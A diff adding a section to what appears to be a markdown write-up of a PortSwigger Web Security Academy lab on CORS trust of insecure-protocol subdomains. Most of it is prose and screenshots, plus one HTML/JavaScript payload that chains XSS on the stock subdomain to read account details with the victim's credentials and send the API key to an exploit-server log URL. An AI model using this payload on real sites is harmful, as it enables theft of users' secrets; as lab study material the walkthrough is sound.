@@ -140,3 +140,69 @@ xhr.send(null);
 <img width="1222" height="508" alt="image" src="https://github.com/user-attachments/assets/3fa24293-c4f2-4325-b925-d5ecaf288290" />
 
 # ------------------------------------------------------------------------------
+
+# 3. CORS vulnerability with trusted insecure protocols
+
+<img width="748" height="223" alt="image" src="https://github.com/user-attachments/assets/a3811415-3b86-4596-a1cc-64108ad0aecc" />
+
+# Goals : Same as above. 
+
+# Ingrediants : Same as above. 
+
+# Solving : 
+
+- Let's start like the last lab and check if it accepts the orbitary or null origin.  
+
+<img width="1212" height="541" alt="image" src="https://github.com/user-attachments/assets/107b6366-d2c8-47f1-bcc7-cc60acc96bba" />
+
+<img width="985" height="447" alt="image" src="https://github.com/user-attachments/assets/fd5ee7ec-70bf-411e-9754-24405c9d9c8f" />
+
+<img width="1067" height="487" alt="image" src="https://github.com/user-attachments/assets/55b2d273-5d0a-45d8-8a34-8ca3c9859e14" />
+
+- We can see everything is failed hence we will try to inject the same origin of the site.
+
+<img width="1068" height="321" alt="image" src="https://github.com/user-attachments/assets/9dad6a72-77a1-4481-9327-c877ff3105ef" />
+
+- It worked now we will try subdomain to this domain. And it is also worked. 
+
+<img width="1202" height="398" alt="image" src="https://github.com/user-attachments/assets/e3e4ffca-9043-4025-8229-67b6ddc2256d" />
+
+- Let's check each button of the website and see if the subdomain changes for any of it.
+
+<img width="1068" height="669" alt="image" src="https://github.com/user-attachments/assets/d6a379a7-7049-4f29-8ce1-38397a7b03bf" />
+
+- We can see a subdomain is added to the domain when we checking the stock.
+
+<img width="1075" height="347" alt="image" src="https://github.com/user-attachments/assets/1cb2c442-7f29-45d9-9663-0c70af98ab53" />
+
+- Let's check if it is vulnerable to xss. However it shows an error the script is implemented properly.
+
+<img width="1083" height="462" alt="image" src="https://github.com/user-attachments/assets/3ebcfe0b-e0b8-438a-b0ef-dcf6d38e649c" />
+
+<img width="817" height="460" alt="image" src="https://github.com/user-attachments/assets/20083191-a804-4c22-ba40-f426fbd5229e" />
+
+- Now we will write a xss script that will retrive the api key for us.
+
+<html>
+<body>
+<script>
+ document.location="http://stock.0a8c00f00336d23e848b916d00ea0036.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a8c00f00336d23e848b916d00ea0036.web-security-academy.net';xhr.onreadystatechange = function(){if(xhr.readyState==XMLHttpRequest.DONE){fetch('https://exploit-0abf006303f5d24d840390d901a2000f.exploit-server.net/log?key=' %2b xhr.responseText)};};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
+</script> 
+</body>
+</html>
+
+- We have inserted the malicious script by xss where it fetches the api key as like we did in the previous since it is xss we have url encoded the <,+ 
+
+<img width="1219" height="459" alt="image" src="https://github.com/user-attachments/assets/56a37cbb-e1ad-40c6-bb15-dd9715a7d7bc" />
+
+- Hence sumitting this script we got the api key. 
+
+<img width="1358" height="496" alt="image" src="https://github.com/user-attachments/assets/20f67b52-ab2a-4e60-be11-8de1ac5da7c4" />
+
+<img width="1058" height="629" alt="image" src="https://github.com/user-attachments/assets/00564058-6805-4ed0-8872-369e082afc9d" />
+
+- Hence by submitting the api key we solve the lab.
+
+<img width="1319" height="549" alt="image" src="https://github.com/user-attachments/assets/8c1325c6-ce5f-4218-8aed-ec5eac6fbe84" />
+
+# ------------------------------------------------------------------------------
